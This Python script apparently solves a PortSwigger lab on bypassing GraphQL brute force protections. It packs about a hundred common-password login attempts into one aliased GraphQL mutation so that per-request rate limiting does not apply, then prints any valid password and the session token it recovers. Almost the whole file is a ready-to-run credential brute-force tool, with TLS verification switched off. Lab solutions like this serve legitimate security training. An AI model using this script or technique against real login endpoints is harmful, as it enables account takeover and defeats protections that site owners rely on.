#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Bypassing GraphQL brute force protections.

Builds a batched GraphQL mutation using aliases — one per password candidate —
and sends it in a single request to bypass per-request rate limiting.
"""

import argparse
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890",
    "michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx",
    "123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter",
    "buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou",
    "2000","charlie","robert","thomas","hockey","ranger","daniel","starwars",
    "klaster","112233","george","computer","michelle","jessica","pepper","1111",
    "zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie",
    "159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer",
    "love","ashley","nicole","chelsea","biteme","matthew","access","yankees",
    "987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom",
    "monitor","monitoring","montana","moon","moscow",
]


def build_payload(username="carlos"):
    aliases = [
        f'attempt{i}: login(input: {{username: "{username}", password: "{pw}"}}) {{ token success }}'
        for i, pw in enumerate(PASSWORDS)
    ]
    query = "mutation {\n" + "\n".join(aliases) + "\n}"
    return {"query": query}


def brute_force(lab, session_cookie, username="carlos"):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    cookies = {"session": session_cookie}
    payload = build_payload(username)

    print(f"[*] Sending {len(PASSWORDS)} aliased login attempts in one request...")
    r = requests.post(
        f"{lab}/graphql/v1",
        json=payload,
        headers=headers,
        cookies=cookies,
        verify=False,
    )

    data = r.json().get("data", {})
    for alias, result in data.items():
        if result and result.get("success"):
            idx = int(alias.replace("attempt", ""))
            password = PASSWORDS[idx]
            print(f"[+] Valid credentials: {username} / {password}")
            print(f"[+] Token: {result.get('token')}")
            return password, result.get("token")

    print("[-] No valid password found.")
    return None, None


def main():
    parser = argparse.ArgumentParser(
        description="Solve Bypassing GraphQL Brute Force Protections lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("--username", default="carlos")
    args = parser.parse_args()

    brute_force(args.lab_url.rstrip("/"), args.session, args.username)


if __name__ == "__main__":
    main()
